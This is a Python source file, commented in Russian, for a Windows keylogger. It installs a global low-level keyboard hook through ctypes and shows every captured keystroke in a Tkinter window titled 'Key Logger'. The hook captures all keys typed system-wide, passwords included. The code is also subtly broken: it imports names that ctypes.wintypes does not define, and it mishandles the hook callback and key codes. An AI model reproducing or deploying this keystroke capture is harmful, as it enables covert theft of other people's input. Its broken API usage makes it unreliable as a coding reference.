import ctypes
import tkinter as tk
import threading

# Импорт необходимых типов данных и функций из библиотеки user32.dll
from ctypes import c_int, c_long, c_ulong, byref, Structure, WinError
from ctypes import WINFUNCTYPE
from ctypes.wintypes import BOOL, DWORD, HHOOK, HWND, MSG, WPARAM, LPARAM, LPWSTR, WCHAR, WH_KEYBOARD_LL, KBDLLHOOKSTRUCT, KBDLLHOOKSTRUCT_PTR, LOWORD, HIWORD
from ctypes import windll, CFUNCTYPE, POINTER

# Определение типов данных и констант из user32.dll
user32 = ctypes.WinDLL('user32', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Определение типов данных для функций и структур user32.dll
HOOKPROC = WINFUNCTYPE(c_long, c_int, WPARAM, LPARAM)
SetWindowsHookEx = user32.SetWindowsHookExW
CallNextHookEx = user32.CallNextHookEx
UnhookWindowsHookEx = user32.UnhookWindowsHookEx
GetMessage = user32.GetMessageW
TranslateMessage = user32.TranslateMessage
DispatchMessage = user32.DispatchMessage
GetCurrentThreadId = kernel32.GetCurrentThreadId
PostQuitMessage = user32.PostQuitMessage

# Константы
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101

# Глобальные переменные
pressed_key = None
hook_handle = None

# Функция обратного вызова для перехвата нажатий клавиш
def keyboard_callback(nCode, wParam, lParam):
    global pressed_key
    if nCode == 0:
        if wParam == WM_KEYDOWN:
            struct = KBDLLHOOKSTRUCT.from_address(lParam)
            pressed_key = struct.vkCode
            print(chr(pressed_key)) # Вывод нажатой клавиши на экран
        elif wParam == WM_KEYUP:
            struct = KBDLLHOOKSTRUCT.from_address(lParam)
            pressed_key = None
    return CallNextHookEx(hook_handle, nCode, wParam, lParam)

# Функция создания и установки хука для перехвата нажатий клавиш
def start_keylogger():
    global hook_handle
    keylogger_callback = HOOKPROC(keyboard_callback)
    hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, keylogger_callback, None, 0)
    if hook_handle == 0:
        raise WinError(ctypes.get_last_error())

# Функция освобождения хука
def stop_keylogger():
    if hook_handle is not None:
        UnhookWindowsHookEx(hook_handle)

# Основное оконное приложение Tkinter
def create_window():
    def on_closing():
        stop_keylogger()
        root.destroy()

    root = tk.Tk()
    root.title("Key Logger")

    label = tk.Label(root, text="Press keys to see them here:")
    label.pack()

    text = tk.Text(root, height=10, width=30)
    text.pack()

    def update_text():
        if pressed_key is not None:
            text.insert(tk.END, chr(pressed_key))
            text.see(tk.END)
        root.after(10, update_text)

    update_text()

    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()

# Главная функция
def main():
    start_keylogger()
    create_window()

if __name__ == "__main__":
    main()